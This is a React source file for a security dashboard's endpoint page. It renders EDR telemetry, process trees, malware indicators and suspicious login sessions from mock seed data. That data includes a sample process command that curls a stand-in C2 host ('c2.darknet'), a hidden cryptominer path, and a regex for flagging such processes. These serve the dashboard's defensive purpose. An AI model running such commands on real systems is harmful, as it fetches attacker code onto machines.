import { createFileRoute } from "@tanstack/react-router";
import { useState, useMemo } from "react";
import { Laptop, ShieldCheck, Cpu, HardDrive, WifiOff, TriangleAlert as AlertTriangle, Lock, Clock as Unlock, Network, Activity, Monitor, MailWarning as FileWarning, UserCheck, Globe, ChevronRight, ChevronDown, X } from "lucide-react";
import { cn } from "@/lib/utils";
import { SeverityBadge } from "@/components/severity-badge";
import { MetricCard } from "@/components/metric-card";
import { useEndpoints } from "@/lib/api-hooks";
import { Switch } from "@/components/ui/switch";
import { Progress } from "@/components/ui/progress";
import { useInspector } from "@/lib/inspector-store";
import { formatDistanceToNow } from "date-fns";
import type { Severity } from "@/lib/mock/types";

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

type EndpointStatus = "online" | "offline" | "quarantined";

interface Endpoint {
  id: string;
  hostname: string;
  os: string;
  user: string;
  agentVersion: string;
  riskScore: number;
  status: EndpointStatus;
  lastCheckIn: Date;
}

interface ProcessNode {
  pid: number;
  name: string;
  cmdline: string;
  children: ProcessNode[];
}

interface ThreatIndicator {
  hash: string;
  type: string;
  action: string;
  severity: Severity;
}

interface Telemetry {
  cpu: number;
  memory: number;
  network: number;
  disk: number;
}

interface Session {
  id: string;
  user: string;
  loginTime: Date;
  sourceIp: string;
  geo: string;
  anomaly: string | null;
}

interface RiskBreakdown {
  process: number;
  network: number;
  identity: number;
  file: number;
}

// ---------------------------------------------------------------------------
// Seed data (deterministic)
// ---------------------------------------------------------------------------



const PROCESS_TREES: Record<string, ProcessNode> = {
  "ep-1": {
    pid: 1, name: "systemd", cmdline: "/sbin/init", children: [
      { pid: 412, name: "nginx", cmdline: "/usr/sbin/nginx -g daemon on", children: [
        { pid: 413, name: "nginx-worker", cmdline: "nginx: worker process", children: [] },
      ] },
      { pid: 780, name: "falconsensor", cmdline: "/opt/CrowdStrike/falconsensor --daemon", children: [] },
      { pid: 901, name: "susp-child", cmdline: "/tmp/.hidden/cryptominer --stealth", children: [
        { pid: 902, name: "sh", cmdline: "/bin/sh -c curl http://c2.darknet/x", children: [] },
      ] },
    ],
  },
  "ep-2": {
    pid: 0, name: "System", cmdline: "ntoskrnl.exe", children: [
      { pid: 584, name: "explorer.exe", cmdline: "C:\\Windows\\explorer.exe", children: [
        { pid: 1204, name: "outlook.exe", cmdline: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", children: [] },
        { pid: 2888, name: "rundll32.exe", cmdline: "rundll32.exe suspicious.dll,EntryPoint", children: [] },
      ] },
    ],
  },
};

const DEFAULT_TREE: ProcessNode = {
  pid: 1, name: "init", cmdline: "/sbin/init", children: [
    { pid: 112, name: "sshd", cmdline: "/usr/sbin/sshd -D", children: [] },
    { pid: 256, name: "falconsensor", cmdline: "/opt/CrowdStrike/falconsensor --daemon", children: [] },
  ],
};

const THREATS: Record<string, ThreatIndicator[]> = {
  "ep-1": [
    { hash: "a3f2b8c1d0e4", type: "Trojan.GenericKD", action: "Quarantined", severity: "critical" },
    { hash: "7e9d4f2a1b06", type: "CoinMiner.XMRig", action: "Blocked", severity: "high" },
  ],
  "ep-2": [
    { hash: "c5d8e2f4a019", type: "Dropper.Emotet", action: "Pending review", severity: "high" },
  ],
  "ep-7": [
    { hash: "f1a3b5c7d9e0", type: "Ransomware.LockBit", action: "Quarantined", severity: "critical" },
    { hash: "2d4e6f8a0c1b", type: "Keylogger.AgentTesla", action: "Blocked", severity: "critical" },
    { hash: "8a0c2e4f6b8d", type: "Downloader.Qakbot", action: "Pending review", severity: "high" },
  ],
};

const TELEMETRY: Record<string, Telemetry> = {
  "ep-1": { cpu: 89, memory: 72, network: 45, disk: 61 },
  "ep-2": { cpu: 34, memory: 81, network: 12, disk: 55 },
  "ep-3": { cpu: 67, memory: 48, network: 88, disk: 23 },
  "ep-4": { cpu: 22, memory: 56, network: 9, disk: 40 },
  "ep-7": { cpu: 95, memory: 91, network: 2, disk: 78 },
};

const DEFAULT_TELEMETRY: Telemetry = { cpu: 30, memory: 45, network: 20, disk: 35 };

const SESSIONS: Record<string, Session[]> = {
  "ep-1": [
    { id: "s-1", user: "svc-nginx", loginTime: new Date(Date.now() - 6 * 3600_000), sourceIp: "10.0.1.12", geo: "US-NYC", anomaly: null },
    { id: "s-2", user: "root", loginTime: new Date(Date.now() - 12 * 3600_000), sourceIp: "185.220.101.34", geo: "DE", anomaly: "Impossible travel" },
  ],
  "ep-2": [
    { id: "s-3", user: "k.morgan", loginTime: new Date(Date.now() - 2 * 3600_000), sourceIp: "192.168.1.55", geo: "US-CHI", anomaly: null },
    { id: "s-4", user: "k.morgan", loginTime: new Date(Date.now() - 45 * 60_000), sourceIp: "103.75.200.18", geo: "RU", anomaly: "New country login" },
  ],
  "ep-7": [
    { id: "s-5", user: "t.nguyen", loginTime: new Date(Date.now() - 8 * 3600_000), sourceIp: "10.0.5.22", geo: "US-SFO", anomaly: null },
    { id: "s-6", user: "admin-backup", loginTime: new Date(Date.now() - 30 * 60_000), sourceIp: "45.33.32.156", geo: "KP", anomaly: "Privilege escalation" },
    { id: "s-7", user: "t.nguyen", loginTime: new Date(Date.now() - 15 * 60_000), sourceIp: "45.33.32.156", geo: "KP", anomaly: "Concurrent session" },
  ],
};

const RISK_BREAKDOWNS: Record<string, RiskBreakdown> = {
  "ep-1": { process: 92, network: 78, identity: 45, file: 68 },
  "ep-2": { process: 65, network: 34, identity: 89, file: 42 },
  "ep-3": { process: 72, network: 88, identity: 23, file: 38 },
  "ep-7": { process: 95, network: 12, identity: 91, file: 88 },
};

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function riskSeverity(score: number): Severity {
  if (score >= 90) return "critical";
  if (score >= 70) return "high";
  if (score >= 50) return "medium";
  return "info";
}

function statusColor(status: EndpointStatus) {
  switch (status) {
    case "online": return "text-healthy";
    case "offline": return "text-muted-foreground";
    case "quarantined": return "text-critical";
  }
}

function statusLabel(status: EndpointStatus) {
  return status.charAt(0).toUpperCase() + status.slice(1);
}

function riskBarColor(value: number): string {
  if (value >= 80) return "bg-critical";
  if (value >= 60) return "bg-high";
  if (value >= 40) return "bg-medium";
  return "bg-info";
}

// ---------------------------------------------------------------------------
// Sub-components
// ---------------------------------------------------------------------------

function ProcessTreeNode({ node, depth = 0 }: { node: ProcessNode; depth?: number }) {
  const [expanded, setExpanded] = useState(depth < 2);
  const hasChildren = node.children.length > 0;
  const suspicious = /hidden|susp|cryptominer|rundll32|darknet/i.test(node.cmdline);

  return (
    <div className="ml-2">
      <button
        onClick={() => hasChildren && setExpanded(!expanded)}
        className={cn(
          "flex items-center gap-1.5 py-1 w-full text-left hover:bg-surface/80 rounded-sm px-1",
          suspicious && "text-critical",
        )}
      >
        <span className="w-4 flex-shrink-0">
          {hasChildren ? (expanded ? <ChevronDown className="size-3.5" /> : <ChevronRight className="size-3.5" />) : <span className="inline-block w-3.5" />}
        </span>
        <span className="font-mono text-xs text-muted-foreground w-12 flex-shrink-0">{node.pid}</span>
        <span className="text-xs font-medium">{node.name}</span>
        <span className="text-[10px] text-muted-foreground truncate ml-2">{node.cmdline}</span>
        {suspicious && <AlertTriangle className="size-3 text-critical ml-auto flex-shrink-0" />}
      </button>
      {expanded && hasChildren && (
        <div className="border-l border-border ml-2">
          {node.children.map((child) => (
            <ProcessTreeNode key={child.pid} node={child} depth={depth + 1} />
          ))}
        </div>
      )}
    </div>
  );
}

function TelemetryBar({ label, value, icon: Icon }: { label: string; value: number; icon: React.ComponentType<{ className?: string }> }) {
  return (
    <div className="space-y-1">
      <div className="flex items-center justify-between text-xs">
        <span className="flex items-center gap-1.5 text-muted-foreground">
          <Icon className="size-3" />
          {label}
        </span>
        <span className={cn("font-mono tabular-nums", value > 80 ? "text-critical" : value > 60 ? "text-high" : "text-foreground")}>
          {value}%
        </span>
      </div>
      <div className="h-1.5 rounded-full bg-border overflow-hidden">
        <div className={cn("h-full rounded-full transition-all", riskBarColor(value))} style={{ width: `${value}%` }} />
      </div>
    </div>
  );
}

// ---------------------------------------------------------------------------
// Page component
// ---------------------------------------------------------------------------

function EndpointsPage() {
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [quarantineConfirm, setQuarantineConfirm] = useState<string | null>(null);
  const [networkBlock, setNetworkBlock] = useState<Record<string, boolean>>({ "ep-7": true });
  const { data: apiEndpoints } = useEndpoints();
  const rawEndpoints = useMemo<Endpoint[]>(() => {
    if (!apiEndpoints?.items) return [];
    return apiEndpoints.items.map(e => ({
      id: e.id,
      hostname: e.hostname,
      os: e.os,
      user: e.ip || "—",
      agentVersion: e.agentVersion,
      riskScore: e.riskScore,
      status: e.isolated ? "quarantined" : (e.status as EndpointStatus),
      lastCheckIn: new Date(e.lastCheckIn),
    }));
  }, [apiEndpoints]);

  const ENDPOINTS = rawEndpoints;
  const inspector = useInspector();

  const selected = ENDPOINTS.find((e) => e.id === selectedId) ?? null;
  const tree = selectedId ? (PROCESS_TREES[selectedId] ?? DEFAULT_TREE) : DEFAULT_TREE;
  const threats = selectedId ? (THREATS[selectedId] ?? []) : [];
  const telemetry = selectedId ? (TELEMETRY[selectedId] ?? DEFAULT_TELEMETRY) : DEFAULT_TELEMETRY;
  const sessions = selectedId ? (SESSIONS[selectedId] ?? []) : [];
  const riskBreakdown = selectedId ? (RISK_BREAKDOWNS[selectedId] ?? { process: 20, network: 15, identity: 10, file: 10 }) : { process: 0, network: 0, identity: 0, file: 0 };

  const total = ENDPOINTS.length;
  const healthy = ENDPOINTS.filter((e) => e.riskScore < 50 && e.status === "online").length;
  const atRisk = ENDPOINTS.filter((e) => e.riskScore >= 70).length;
  const offline = ENDPOINTS.filter((e) => e.status === "offline").length;
  const quarantined = ENDPOINTS.filter((e) => e.status === "quarantined").length;

  function handleIsolate(id: string) {
    setQuarantineConfirm(id);
  }

  function confirmIsolate(id: string) {
    setQuarantineConfirm(null);
    // In a real app, this would call an API
  }

  return (
    <div className="space-y-6">
      {/* ---- Header ---- */}
      <div className="flex items-center gap-3">
        <Laptop className="size-5 text-foreground" />
        <div>
          <h1 className="text-lg font-semibold">Endpoints</h1>
          <p className="text-xs text-muted-foreground">Fleet-wide device posture, EDR telemetry, and isolation controls</p>
        </div>
      </div>

      {/* ---- KPI cards ---- */}
      <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 lg:grid-cols-5">
        <MetricCard label="Total" value={total} icon={Laptop} tone="default" />
        <MetricCard label="Healthy" value={healthy} icon={ShieldCheck} tone="healthy" />
        <MetricCard label="At Risk" value={atRisk} icon={AlertTriangle} tone="high" delta={{ v: "4%", up: true }} />
        <MetricCard label="Offline" value={offline} icon={WifiOff} tone="info" />
        <MetricCard label="Quarantined" value={quarantined} icon={Lock} tone="critical" />
      </div>

      {/* ---- Main content ---- */}
      <div className="grid gap-4 lg:grid-cols-[1fr_420px]">
        {/* Left: Endpoint table */}
        <div className="rounded-lg border border-border bg-surface/60 overflow-hidden">
          <div className="px-4 py-3 border-b border-border flex items-center justify-between">
            <span className="text-xs font-medium uppercase tracking-wider font-mono text-muted-foreground">Endpoint Inventory</span>
            <span className="text-[10px] text-muted-foreground">{ENDPOINTS.length} devices</span>
          </div>
          <div className="overflow-x-auto">
            <table className="w-full text-xs">
              <thead>
                <tr className="border-b border-border text-muted-foreground">
                  <th className="px-4 py-2 text-left font-medium">Hostname</th>
                  <th className="px-4 py-2 text-left font-medium">OS</th>
                  <th className="px-4 py-2 text-left font-medium">User</th>
                  <th className="px-4 py-2 text-left font-medium">Agent</th>
                  <th className="px-4 py-2 text-left font-medium">Risk</th>
                  <th className="px-4 py-2 text-left font-medium">Status</th>
                  <th className="px-4 py-2 text-left font-medium">Last Check-in</th>
                </tr>
              </thead>
              <tbody>
                {ENDPOINTS.map((ep) => (
                  <tr
                    key={ep.id}
                    onClick={() => setSelectedId(ep.id === selectedId ? null : ep.id)}
                    className={cn(
                      "border-b border-border/50 cursor-pointer transition-colors hover:bg-surface/80",
                      selectedId === ep.id && "bg-surface ring-1 ring-in-ring ring-border",
                    )}
                  >
                    <td className="px-4 py-2.5 font-mono font-medium">{ep.hostname}</td>
                    <td className="px-4 py-2.5 text-muted-foreground">{ep.os}</td>
                    <td className="px-4 py-2.5 font-mono">{ep.user}</td>
                    <td className="px-4 py-2.5 text-muted-foreground">v{ep.agentVersion}</td>
                    <td className="px-4 py-2.5">
                      <span className={cn(
                        "inline-flex items-center gap-1 font-mono font-semibold tabular-nums",
                        ep.riskScore >= 90 ? "text-critical" : ep.riskScore >= 70 ? "text-high" : ep.riskScore >= 50 ? "text-medium" : "text-info",
                      )}>
                        {ep.riskScore}
                      </span>
                    </td>
                    <td className="px-4 py-2.5">
                      <span className={cn("flex items-center gap-1.5", statusColor(ep.status))}>
                        <span className="size-1.5 rounded-full bg-current" />
                        {statusLabel(ep.status)}
                      </span>
                    </td>
                    <td className="px-4 py-2.5 text-muted-foreground tabular-nums">
                      {formatDistanceToNow(ep.lastCheckIn, { addSuffix: true })}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>

        {/* Right: Detail panel */}
        <div className="space-y-4">
          {!selected ? (
            <div className="flex flex-col items-center justify-center h-64 rounded-lg border border-border bg-surface/40 text-muted-foreground">
              <Monitor className="size-8 mb-2 opacity-40" />
              <span className="text-xs">Select an endpoint to inspect</span>
            </div>
          ) : (
            <>
              {/* Endpoint header */}
              <div className="rounded-lg border border-border bg-surface/60 p-4 space-y-3">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Laptop className="size-4" />
                    <span className="font-mono font-semibold text-sm">{selected.hostname}</span>
                  </div>
                  <SeverityBadge severity={riskSeverity(selected.riskScore)} />
                </div>
                <div className="grid grid-cols-2 gap-2 text-xs text-muted-foreground">
                  <div>OS: <span className="text-foreground">{selected.os}</span></div>
                  <div>User: <span className="font-mono text-foreground">{selected.user}</span></div>
                  <div>Agent: <span className="text-foreground">v{selected.agentVersion}</span></div>
                  <div>Check-in: <span className="text-foreground tabular-nums">{formatDistanceToNow(selected.lastCheckIn, { addSuffix: true })}</span></div>
                </div>
              </div>

              {/* Isolation actions */}
              <div className="rounded-lg border border-border bg-surface/60 p-4 space-y-3">
                <span className="text-xs font-medium uppercase tracking-wider font-mono text-muted-foreground">Isolation Controls</span>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2 text-xs">
                    {selected.status === "quarantined" ? <Lock className="size-3.5 text-critical" /> : <Unlock className="size-3.5 text-healthy" />}
                    <span>{selected.status === "quarantined" ? "Endpoint quarantined" : "Endpoint active"}</span>
                  </div>
                  {quarantineConfirm === selected.id ? (
                    <div className="flex items-center gap-2">
                      <button onClick={() => confirmIsolate(selected.id)} className="px-2 py-1 rounded text-[10px] font-medium bg-critical/20 text-critical border border-critical/40 hover:bg-critical/30 transition-colors">
                        Confirm
                      </button>
                      <button onClick={() => setQuarantineConfirm(null)} className="px-2 py-1 rounded text-[10px] font-medium bg-surface border border-border hover:bg-border/50 transition-colors">
                        Cancel
                      </button>
                    </div>
                  ) : (
                    <button
                      onClick={() => handleIsolate(selected.id)}
                      className={cn(
                        "px-2.5 py-1 rounded text-[10px] font-medium border transition-colors",
                        selected.status === "quarantined"
                          ? "bg-healthy/15 text-healthy border-healthy/40 hover:bg-healthy/25"
                          : "bg-critical/15 text-critical border-critical/40 hover:bg-critical/25",
                      )}
                    >
                      {selected.status === "quarantined" ? "Unquarantine" : "Isolate"}
                    </button>
                  )}
                </div>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2 text-xs">
                    <Network className="size-3.5" />
                    <span>Network block</span>
                  </div>
                  <Switch
                    checked={!!networkBlock[selected.id]}
                    onCheckedChange={(v) => setNetworkBlock((prev) => ({ ...prev, [selected.id]: v }))}
                  />
                </div>
              </div>

              {/* Telemetry */}
              <div className="rounded-lg border border-border bg-surface/60 p-4 space-y-3">
                <span className="text-xs font-medium uppercase tracking-wider font-mono text-muted-foreground">Device Telemetry</span>
                <div className="space-y-2.5">
                  <TelemetryBar label="CPU" value={telemetry.cpu} icon={Cpu} />
                  <TelemetryBar label="Memory" value={telemetry.memory} icon={HardDrive} />
                  <TelemetryBar label="Network" value={telemetry.network} icon={Activity} />
                  <TelemetryBar label="Disk" value={telemetry.disk} icon={HardDrive} />
                </div>
              </div>

              {/* Behavioral analytics / Risk breakdown */}
              <div className="rounded-lg border border-border bg-surface/60 p-4 space-y-3">
                <span className="text-xs font-medium uppercase tracking-wider font-mono text-muted-foreground">Behavioral Risk</span>
                <div className="space-y-2">
                  {(["process", "network", "identity", "file"] as const).map((dim) => (
                    <div key={dim} className="space-y-1">
                      <div className="flex items-center justify-between text-xs">
                        <span className="capitalize text-muted-foreground">{dim}</span>
                        <span className={cn(
                          "font-mono tabular-nums",
                          riskBreakdown[dim] >= 80 ? "text-critical" : riskBreakdown[dim] >= 60 ? "text-high" : riskBreakdown[dim] >= 40 ? "text-medium" : "text-info",
                        )}>
                          {riskBreakdown[dim]}
                        </span>
                      </div>
                      <Progress value={riskBreakdown[dim]} className={cn(
                        "h-1.5",
                        riskBreakdown[dim] >= 80 ? "[&>div]:bg-critical" : riskBreakdown[dim] >= 60 ? "[&>div]:bg-high" : riskBreakdown[dim] >= 40 ? "[&>div]:bg-medium" : "[&>div]:bg-info",
                      )} />
                    </div>
                  ))}
                </div>
              </div>

              {/* Process tree */}
              <div className="rounded-lg border border-border bg-surface/60 p-4 space-y-2">
                <span className="text-xs font-medium uppercase tracking-wider font-mono text-muted-foreground">Process Tree</span>
                <ProcessTreeNode node={tree} />
              </div>

              {/* Malware indicators */}
              {threats.length > 0 && (
                <div className="rounded-lg border border-border bg-surface/60 p-4 space-y-2">
                  <span className="text-xs font-medium uppercase tracking-wider font-mono text-muted-foreground flex items-center gap-1.5">
                    <FileWarning className="size-3" />
                    Malware Indicators
                  </span>
                  <div className="space-y-2">
                    {threats.map((t, i) => (
                      <div key={i} className="flex items-center gap-2 text-xs border border-border/50 rounded p-2 bg-surface/40">
                        <SeverityBadge severity={t.severity} />
                        <span className="font-mono text-[10px] text-muted-foreground flex-shrink-0">{t.hash}</span>
                        <span className="truncate">{t.type}</span>
                        <span className="ml-auto text-muted-foreground flex-shrink-0">{t.action}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Suspicious sessions */}
              {sessions.length > 0 && (
                <div className="rounded-lg border border-border bg-surface/60 p-4 space-y-2">
                  <span className="text-xs font-medium uppercase tracking-wider font-mono text-muted-foreground flex items-center gap-1.5">
                    <UserCheck className="size-3" />
                    Active Sessions
                  </span>
                  <div className="space-y-2">
                    {sessions.map((s) => (
                      <div key={s.id} className={cn(
                        "flex items-start gap-3 text-xs border border-border/50 rounded p-2",
                        s.anomaly ? "bg-critical/5 border-critical/20" : "bg-surface/40",
                      )}>
                        <Globe className={cn("size-3.5 mt-0.5 flex-shrink-0", s.anomaly ? "text-critical" : "text-muted-foreground")} />
                        <div className="space-y-0.5 flex-1 min-w-0">
                          <div className="flex items-center justify-between">
                            <span className="font-mono font-medium">{s.user}</span>
                            <span className="text-[10px] text-muted-foreground tabular-nums">
                              {formatDistanceToNow(s.loginTime, { addSuffix: true })}
                            </span>
                          </div>
                          <div className="flex items-center gap-2 text-muted-foreground">
                            <span className="font-mono">{s.sourceIp}</span>
                            <span className="text-border">|</span>
                            <span>{s.geo}</span>
                          </div>
                          {s.anomaly && (
                            <div className="flex items-center gap-1 text-critical font-medium mt-0.5">
                              <AlertTriangle className="size-3" />
                              {s.anomaly}
                            </div>
                          )}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </>
          )}
        </div>
      </div>
    </div>
  );
}

// ---------------------------------------------------------------------------
// Route export
// ---------------------------------------------------------------------------

export const Route = createFileRoute("/_app/endpoints")({
  head: () => ({ meta: [{ title: "Endpoints — NEXUS" }] }),
  component: EndpointsPage,
});
